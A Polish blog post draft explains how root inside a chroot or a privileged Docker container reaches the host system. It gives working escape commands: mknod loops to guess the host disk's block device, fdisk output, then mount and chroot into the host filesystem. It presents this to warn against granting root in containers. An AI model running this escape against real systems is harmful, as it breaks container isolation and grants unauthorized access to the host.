Hacking the chroot/docker
#########################

:keywords: linux, chroot, hacking, docker
:tags: linux, chroot, hacking, docker
:date: 2019-03-03
:Status: draft
:slug: chroot-breaking-1


W tym poście pokażę jak mając *root* w *chroot* dostać się do systemu nadzorcy.  
Tym samym chcę pokazać, dlaczego nie należy przyznawać praw administratora użytkownikowi nawet w *chroot*.

Crash course
------------

.. youtube:: TQRcC2OEHn8

Ponieważ *docker* (podobnie jak większość technologi kontenerowych) używa *chroot*-a, wyjście z *chroot* czy *docker* sprowadza się do tej samej metody.
Poniższa metoda wymaga posiadania konta *root* w kontenerze uruchomionego z uprawnieniami *privileged* (w przypadku *docker*)

.. code-block:: console

    # docker run -it --privileged centos /bin/bash
    # mknod /tmp/host_disk b 259 1
    # mount /tmp/host_disk /mnt/
    # chroot /mnt/ /bin/bash

Analiza metody
--------------

.. youtube:: CVRyg4fYdq4

Metoda ta wykorzystuje *chroot* do *filesystem*-u systemu głównego.
Ponieważ w *chroot* najczęściej nie mamy zamontowanego katalogu ``/dev/``, a tym samym, nie możemy zamontować *filesystem*-u nadzorcy, musimy samodzielnie utworzyć urządzenie odpowiadające dyskowi z tymże *filesystem*-em.

Urządzenia w Linuksie są specjalnymi plikami.
W kontekście urządzeń, najczęściej wyróżniamy urządzenia blokowe oraz znakowe.
Urządzenia znakowe, jak sama nazwa wskazuje, prowadzą komunikację znak po znaku, natomiast urządzenia blokowe poprzez bloki.
Najczęściej również urządzenia znakowe pozwalają jedynie na odczyt i zapis. Takimi urządzeniami mogą być mysz, klawiatura, urządzenie ``/dev/random``, pseudo-terminale.
Urządzenia blokowe najczęściej pozwalają na adresowanie oraz dowolny dostęp. Przykładem takiego urządzenia jest np: dysk twardy, cdrom.

Każdy specjalny plik reprezentujący urządzenie jest określany przez trzy parametry:

- typ: czy jest to urządzenie blokowe, czy znakowe
- major: numer główny typu urządzenia
- minor: numer pomocniczy typu urządzenia

Jądro systemu Linuks bazując na typie oraz numerach major i minor wie do którego sterownika przekierować obsługę operacji na danym urządzeniu.
Lista zdefiniowanych numerów major i minor wraz z typami znajduje się w `dokumentacji jądra Linuksa`_

Aby utworzyć specjalny plik urządzenia, należy użyć polecenia ``mknod``.
I tutaj pojawia się problem.
Ponieważ musimy znać major i minor dysku, dla którego chcemy utworzyć plik urządzenia, dlatego *odgadnięcie* tych wartości jest jedyną trudnością jaka nas czeka.
Posiłkując się dokumentacją widzimy, że urządzenia blokowe o majorze 3, to są dyski IDE, natomiast major 8 to są dyski SCSI.
Warto rozpocząć szukanie odpowiedniego dysku od tych wartości.
Jeżeli nie jest to żaden ze standardowych dysków, można w pętli utworzyć wszystkie urządzenia próbując znaleźć odpowiednie.

.. code-block:: console

    # docker run --rm -it --privileged centos /bin/bash
    # mkdir /tmp/devices
    # cd /tmp/devices/
    # for i in $(seq 1 300); do mknod device_$i b $i 0; done
    # ls -l
    brw-r--r--. 1 root root   1, 0 Feb 10 16:57 device_1
    brw-r--r--. 1 root root  10, 0 Feb 10 16:57 device_10
    brw-r--r--. 1 root root 100, 0 Feb 10 16:57 device_100
    brw-r--r--. 1 root root 101, 0 Feb 10 16:57 device_101
    brw-r--r--. 1 root root 102, 0 Feb 10 16:57 device_102
    brw-r--r--. 1 root root 103, 0 Feb 10 16:57 device_103
    brw-r--r--. 1 root root 104, 0 Feb 10 16:57 device_104
    (...)
    # fdisk  -l * 2>/dev/null
    Disk device_1: 16 MB, 16777216 bytes, 32768 sectors
    Units = sectors of 1 * 512 = 512 bytes
    Sector size (logical/physical): 512 bytes / 512 bytes
    I/O size (minimum/optimal): 512 bytes / 512 bytes
    
    Disk device_253: 44.0 GB, 44023414784 bytes, 85983232 sectors
    Units = sectors of 1 * 512 = 512 bytes
    Sector size (logical/physical): 512 bytes / 512 bytes
    I/O size (minimum/optimal): 512 bytes / 512 bytes
    Disk label type: dos
    Disk identifier: 0x0009b93d
    
          Device Boot      Start         End      Blocks   Id  System
    device_253p1   *        2048    83886079    41942016   83  Linux

Widzimy, że tylko dwa urządzenia zostały rozpoznane: ``device_1`` oraz ``device_253``.
``device_1`` to ``RAM disk``, więc nas nie interesuje, natomiast drugie urządzenie wygląda jak dysk nadzorcy.
Gdyby nie udało się tutaj znaleźć interesującego nas dysku, należałoby rozszerzyć poszukiwania o numery minorów inne niż 0.
Ponieważ minor 0 oznacza cały dysk, a my musimy uzyskać dostęp do partycji, musimy utworzyć urządzenie tejże partycji.

.. code-block:: console

    # mknod device_253_1 b 253 1

Mając takie urządzenie, możemy przystąpić do standardowej procedury wykonania *chroot*, czyli zamontowanie partycji oraz wykonanie polecenia ``chroot``.

.. code-block:: console

    # mount device_253_1 /mnt/
    # chroot /mnt/ /bin/bash

Tym sposobem udało nam się dostać do systemu nadzorcy wychodząc z *chroot* w którym posiadaliśmy prawa *root*.

.. _dokumentacji jądra Linuksa: https://github.com/torvalds/linux/blob/master/Documentation/admin-guide/devices.txt
